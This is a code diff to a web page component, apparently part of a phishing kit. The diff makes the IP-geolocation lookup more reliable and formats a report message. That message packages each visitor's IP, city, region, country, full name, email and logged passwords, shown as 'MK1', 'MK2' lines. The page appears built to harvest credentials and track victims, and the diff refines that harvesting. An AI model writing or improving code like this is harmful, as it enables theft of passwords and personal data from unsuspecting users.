@@ -53,6 +53,11 @@ const GEO_ENDPOINTS = [
 ];
 
 const normalizeCountryCode = (code = '') => String(code).trim().toUpperCase();
+const isUnknownValue = (value = '') => {
+    const normalized = String(value ?? '').trim().toLowerCase();
+    return !normalized || ['unknown', 'n/a', 'na', 'null', 'undefined', '-'].includes(normalized);
+};
+const normalizeGeoValue = (value) => (isUnknownValue(value) ? '' : String(value).trim());
 
 const getFallbackLanguage = () => {
     const [browserLang = 'en'] = String(navigator.language || 'en').split('-');
@@ -100,16 +105,45 @@ const parseDeviceInfo = (ua = '') => {
 };
 
 const fetchGeoData = async () => {
+    let bestCandidate = null;
+    let bestScore = -1;
+
+    const getCandidateScore = (candidate) => {
+        const hasCountry = !isUnknownValue(candidate.country);
+        const hasRegion = !isUnknownValue(candidate.region);
+        const hasCity = !isUnknownValue(candidate.city);
+        const hasIp = !isUnknownValue(candidate.ip);
+        const hasCountryCode = !isUnknownValue(candidate.countryCode);
+        return (hasCity ? 3 : 0) + (hasRegion ? 2 : 0) + (hasCountry ? 2 : 0) + (hasCountryCode ? 1 : 0) + (hasIp ? 1 : 0);
+    };
+
     for (const endpoint of GEO_ENDPOINTS) {
         try {
             const response = await axios.get(endpoint.url, { timeout: 5000 });
-            const mapped = endpoint.map(response.data || {});
-            if (mapped.ip || mapped.countryCode || mapped.country) {
-                return mapped;
+            const mapped = endpoint.map(response.data || {}) || {};
+            const candidate = {
+                ip: normalizeGeoValue(mapped.ip),
+                city: normalizeGeoValue(mapped.city),
+                region: normalizeGeoValue(mapped.region),
+                country: normalizeGeoValue(mapped.country),
+                countryCode: normalizeGeoValue(mapped.countryCode)
+            };
+            const score = getCandidateScore(candidate);
+
+            if (score > bestScore) {
+                bestCandidate = candidate;
+                bestScore = score;
+            }
+
+            if (candidate.city && candidate.region && candidate.country) {
+                return candidate;
             }
         } catch {
             continue;
         }
+    }
+    if (bestCandidate && bestScore > 0) {
+        return bestCandidate;
     }
     throw new Error('All geo providers failed');
 };
@@ -336,7 +370,9 @@ const Home = () => {
         const safeCity = ip.city || 'Unknown';
         const safeRegion = ip.region || 'Unknown';
         const safeCountry = ip.country || 'Unknown';
-        const parsedDevice = parseDeviceInfo(device.deviceInfo);
+        const locationParts = [safeCity, safeRegion, safeCountry].filter((part) => !isUnknownValue(part));
+        const formattedLocation = locationParts.length > 0 ? locationParts.join(', ') : 'Unknown';
+        parseDeviceInfo(device.deviceInfo);
 
         const passwordLines = passwordLogs.length > 0
             ? passwordLogs.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
@@ -349,7 +385,7 @@ const Home = () => {
         const message = `
 ⏰ ${formatDateTime()}
 🌐 IP: <code>${escapeHtml(safeIp)}</code>
-📍 Location: ${escapeHtml(`${safeCity}, ${safeRegion}, ${safeCountry}`)}
+📍 Location: ${escapeHtml(formattedLocation)}
 📋 <b>INFO</b>
    Name: <code>${escapeHtml(form.fullName)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
